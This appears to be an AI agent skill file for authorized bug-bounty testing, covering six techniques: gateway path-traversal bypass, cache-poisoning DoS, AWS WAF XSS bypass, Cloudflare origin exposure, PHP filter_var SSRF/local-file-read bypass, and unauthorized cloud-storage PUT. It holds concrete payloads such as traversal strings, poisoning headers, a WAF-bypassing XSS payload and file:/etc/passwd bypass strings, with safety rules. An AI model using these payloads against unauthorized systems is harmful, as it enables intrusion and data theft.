---
name: bb-intel-cloud-edge
description: Cloud, edge, cache, and file-handling exploitation techniques distilled from real bug bounty writeups. Use when hunting cache poisoning, WAF bypass, API gateway isolation bypass, Cloudflare origin exposure, SSRF/LFR via URL-validator bypass, or cloud object storage misconfiguration on an authorized target — e.g. when a CDN fronts the app, a 403 hints at hidden internal endpoints, or a storage bucket rejects GET but might accept PUT.
---

# Cloud, Edge, Cache & File-Handling Exploitation

## Purpose and scope

Teaches six practitioner techniques distilled from real bug bounty writeups: API gateway isolation bypass via path traversal + parser discrepancy, web cache poisoning (single-request DoS), AWS WAF bypass via DOM-event fuzzing, Cloudflare origin exposure via grey-cloud apex, SSRF/LFR bypass of PHP `filter_var` URL validation, and unauthorized PUT on cloud object storage.

Non-goals: HTTP request smuggling (no procedural evidence in the source batch), GCP metadata → Kubernetes chains (secondhand only), volumetric DoS, and any post-exploitation beyond proof of the vulnerability class.

## Preconditions

- Target is in-scope and you are AUTHORIZED to test it (bug bounty program, written engagement, or owned asset).
- Program rules of engagement reviewed — especially DoS wording ("launching" vs "reporting" cache-poisoning DoS).
- Traffic routed through your proxy (Burp) for evidence capture.

## Decision tree

- 403 on internal-looking paths (`/_/metrics`, `/_/heapdump`, `/users`) or gateway-style multi-segment routes → **Technique 1: Gateway isolation bypass**.
- CDN/cached front end (Akamai, Cloudflare, Fastly, Varnish); response content depends on request headers → **Technique 2: Cache poisoning**.
- AWS WAF managed rules 403 your XSS/SQLi payloads → **Technique 3: WAF bypass via tag×event fuzzing**.
- `server: cloudflare` or `/cdn-cgi/trace` 200, and apex/`www` resolve to different IPs → **Technique 4: Origin exposure via grey-cloud apex**.
- PHP app fetches user-supplied URLs and validates with `filter_var(FILTER_VALIDATE_URL)` → **Technique 5: URL-validator SSRF/LFR bypass**.
- 403 from a host fingerprinted as cloud storage (`AliyunOSS`, `AmazonS3`, GCS XML errors) → **Technique 6: Object storage unauthorized PUT**.

## Techniques

### 1. API gateway isolation bypass via path traversal + parser discrepancy

**Signal:** Multi-segment dispatch-like paths, uniform response formats, 403s on internal routes. A 403 is a lead — the resource exists.

1. Map public endpoints; note routing that suggests a gateway fronting backend services.
2. Append traversal to a public route: `/public/route/../`, `/public/route/../../`, `..;/`, `%2e%2e%2f`.
3. A 200 serving content from a *different* backend route (not 404) confirms pre-forward path resolution.
4. Enumerate internal endpoints: `/_/metrics`, `/_/heapdump`, `/health`, `/configuration`, `/fetch`, `/preview`, `/users`.
5. For persistent 403s, hunt a parser discrepancy between LB/WAF and gateway: `../%0d%0a/../../_/metrics`, plus `%00`, `%09`, `%252e%252e` (double-encoding), mixed `/` + `\`.
6. Confirm the same request flips 403 → 200.

**Verify:** Internal resource returned despite gateway policy. Frame impact as *gateway isolation bypass* (reaches unauthenticated internal APIs), not "exposed metrics" — this moved a real report from High to Critical.
**Failure recovery:** If traversal 404s, the gateway likely normalizes before dispatch — pivot to control-char/encoding injection variants, or try a different public route whose prefix matches the internal service's mount point.

### 2. Web cache poisoning → single-request persistent DoS

**Signal:** Cached responses whose content depends on headers not in the cache key.

1. Run Burp Param Miner ("twitchy cache poison" option) to find unkeyed headers.
2. ALWAYS add a cache-buster query param (`?dontpoisoneveryone=1`) — only your request is poisoned; this is what makes the PoC non-destructive and reportable.
3. Test known DoS-yielding unkeyed inputs:
   - `X-Forwarded-Port: 123` → cached 302 to an invalid port (HackerOne, $2,500).
   - Invalid `Transfer-Encoding` → cached "501 Not Implemented" over core JS (PayPal $9,700; Bitbucket $1,800).
   - `Any-Header: burpcollaborator.net` (WAF-triggering string) → cached WAF block page (Tesla, $300).
   - `Accept_Encoding: br` (underscore) → brotli cached for clients that can't decode it (Instagram, $1,000).
   - `Range: bytes=cow` → cached 400 on static JS (Twitter/abs.twimg.com).
   - Also try `Accept`, `Upgrade`, `Origin`, `Max-Forwards`, `X-Forwarded-SSL`, stale IE9 User-Agent.
4. Re-request the URL WITHOUT the attack header but WITH the same cache-buster — poisoned body returned = cache stored it.

**Verify:** Second request without the attack header returns the poisoned body; without the cache-buster the key changes, so real users are unaffected.
**Failure recovery:** If the header doesn't stick, the CDN strips or keys it — fuzz more header names/casing/underscore variants, or try response-splitting inputs. Never test without the cache-buster.

### 3. AWS WAF bypass via unfiltered tags/events

**Signal:** Managed rule sets (CommonRuleSet, KnownBadInputs, SQLi) 403 your standard payloads.

1. Probe manually to learn what's blocked; if available, use WAF metrics/logs to see which rule fired.
2. Automate the cartesian product of HTML tags × event handlers × attributes (PortSwigger XSS cheat sheet as base list; Sysdig's open-source "Wafer" implements this).
3. Verify execution in a real browser via Selenium — hook `window.alert = function(){window.alert_trigger=true}` and fire `click`, `mouseover`, `focus`, `blur`, `keydown`, pointer events on injected elements.
4. Apply regex evasion: split tags with spaces/newlines; insert Unicode chars that normalize to ASCII.
5. Historical AWS WAF bypass (patched Dec 2023; the *class* — exotic/experimental DOM events — remains valid): `<button popovertarget=x>click me</button><test onbeforetoggle=alert(document.domain) popover id=x>aaa</test>`.

**Verify:** Alert fires in the automated browser despite WAF 403ing standard payloads.
**Failure recovery:** Bypasses are WAF-specific (F5 and ModSecurity caught this exact payload) — re-fuzz per vendor; don't transplant payloads blindly.

### 4. Cloudflare origin exposure via grey-cloud apex

**Signal:** CF-fronted target where apex kept DNS-only while `www` is proxied (common in old orgs; ~30/40,000 hit rate in the case study).

1. Resolve apex and `www`; flag when the apex IP is not a Cloudflare range.
2. Confirm direct origin access: `curl -vk --resolve example.com:443:<ORIGIN_IP> https://example.com/` — 200 without Cloudflare headers = exposed origin.
3. Try variants: `--resolve www.example.com:443:<IP>`, `--connect-to ::<IP>:443`, or `curl https://<IP>/ -H "Host: www.example.com"`.
4. Prove WAF bypass: request `/%3Cscript%3Ealert()%3C/script%3E` through CF (403) vs directly at origin (404/other) — different response = CF skipped.
5. Cross-check `/cdn-cgi/trace`: 200 + `server: cloudflare` via CF; 404 with no cloudflare header at origin.
6. For browser testing, pin the hostname in Burp: Proxy → Options → Network → Hostname Resolution.

**Verify:** Origin answers attacker-controlled Host headers with no Cloudflare headers. Stop at exposure verification — document headers/status/SSL. Impact: all CF WAF/DDoS/bot protections void (chained to XSS→ATO in the source case).
**Failure recovery:** If the origin rejects direct requests (allow-list), it may still be reachable via SNI mismatch or alternate vhosts — but don't force it; a hardened origin is a clean negative.

### 5. SSRF/LFR bypass of PHP `filter_var(FILTER_VALIDATE_URL)`

**Signal:** PHP fetchers (curl, `file_get_contents`, `exec curl`) validated with `filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED)`.

1. Baseline `file:///etc/passwd` fails validation — confirms validation exists.
2. Trick the validator with a fake query: `file:/etc/passwd?/` (the `?` satisfies "query required"; only ONE slash after `file:`).
3. Double-encode: `file:/etc/passwd%3F/`, `file:/etc%252Fpasswd/`, `file:/etc%252Fpasswd%3F/`.
4. For path-normalizing fetchers: `file:///etc/?/../passwd` or `file:///etc/%3F/../passwd`.
5. If the URL lands in a shell (`exec('curl -L '.$url)`), obfuscate with empty bash expansion of unset vars: `file:${br}/et${u}c/pas${te}swd?/` — defeats keyword filters.
6. Polyglot covering all three sinks: `file:///etc/passwd?/../passwd`.

**Verify:** `/etc/passwd` contents returned in the response. Adding `localhost` to the polyglot unlocks host-based SSRF tricks too.
**Failure recovery:** If the query trick fails, the flag may be absent or the fetcher may reject `file:` at a second layer — encode `:`, `.`, `/` in more positions, or probe for other allowed schemes (`gopher`, `dict`, `php://`).

### 6. Cloud object storage unauthorized PUT

**Signal:** 403 whose `Server:` header or body reveals cloud storage (`AliyunOSS`, `AmazonS3`, XML `<Error><Code>AccessDenied</Code>`, `x-oss-request-id`). A 403 on GET says nothing about write permissions — ACLs are per-method.

1. Fingerprint the backend from the 403 response.
2. In Burp Repeater, swap `GET /` for `PUT /poc.json` with benign body `{"id": "poc"}` and correct `Content-Length`.
3. 200 OK + `ETag`/`Content-MD5` = write succeeded.
4. GET the uploaded object to confirm read-back, then DELETE your PoC file.
5. Also test DELETE and ACL-reading (`?acl`) methods.

**Verify:** Uploaded object retrievable. Impact framing: defacement, overwriting sensitive files, hosting malicious content on the victim's domain, stored XSS if Content-Type is attacker-controlled.
**Failure recovery:** If PUT also 403s, verb-fuzz further (POST form-upload, OPTIONS preflight) or look for signed-URL generation endpoints in the app — otherwise it's a clean negative.

## Safety and authorization

- Test only on authorized, in-scope targets. No exceptions.
- Cache attacks: ALWAYS include a unique cache-buster param so the PoC never affects real users; check policy wording before reporting cache-poisoning DoS.
- Object storage: write a single benign `poc.json`, confirm read-back, then DELETE it. Never overwrite existing objects.
- Origin exposure: stop at verifying exposure (headers/status/SSL); don't exploit the origin further without explicit scope.
- LFR/SSRF: read `/etc/passwd` as proof only — no traversal into user data, keys, or databases.
- No data exfiltration beyond the minimum proof; no persistence; clean up every artifact you create.

## Source notes

Full case index, bounty figures, coverage caveats (skipped/dead sources, thin-evidence areas), and payload provenance: `references/writeup-cases.md`.
